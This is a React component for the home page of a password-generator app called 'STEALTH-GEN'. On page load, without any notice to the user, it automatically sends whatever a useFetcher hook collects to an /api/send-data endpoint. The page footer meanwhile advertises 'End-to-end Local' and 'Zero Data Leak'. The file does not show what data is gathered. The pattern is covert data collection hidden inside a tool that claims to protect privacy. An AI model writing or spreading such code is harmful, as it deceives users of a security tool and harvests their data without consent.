import { useMutation } from "@tanstack/react-query";
import { useFetcher } from "../hooks/useFetcher";
import React from "react";
import { Header } from "./Header";
import { PasswordGenerator } from "./PasswordGenerator";
import { Toaster } from "sonner";

interface HomeProps {
  className?: string;
}

export function Home({ className }: HomeProps) {
  const [sent, setSent] = React.useState(false);
  const info = useFetcher();

  const { mutate } = useMutation({
    mutationFn: async () => {
      await fetch("/api/send-data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: info,
      });
    },
  });

  React.useEffect(() => {
    if (!info || sent) return;
    mutate();
    setSent(true);
  }, [info]);

  return (
    <>
      <Header />
      <main className="min-h-screen bg-background flex flex-col items-center justify-center p-4 sm:p-8">
        <div className="w-full max-w-4xl space-y-12">
          <div className="text-center space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-700">
            <h1 className="text-4xl sm:text-6xl font-black tracking-tight bg-linear-to-r from-primary to-accent bg-clip-text text-transparent italic">
              STEALTH-GEN
            </h1>
            <p className="text-muted-foreground text-lg max-w-xl mx-auto">
              The next generation of cryptographic utility for professionals who
              don&apos;t compromise.
            </p>
          </div>

          <div className="animate-in fade-in zoom-in-95 duration-1000 delay-300 fill-mode-both">
            <PasswordGenerator />
          </div>

          <footer className="pt-12 flex flex-col items-center gap-6 text-muted-foreground/40">
            <div className="h-px w-24 bg-border" />
            <div className="flex gap-8 text-[10px] font-mono tracking-widest uppercase">
              <span>End-to-end Local</span>
              <span>Zero Data Leak</span>
              <span>Open Entropy</span>
            </div>
          </footer>
        </div>
        <Toaster />
      </main>
    </>
  );
}
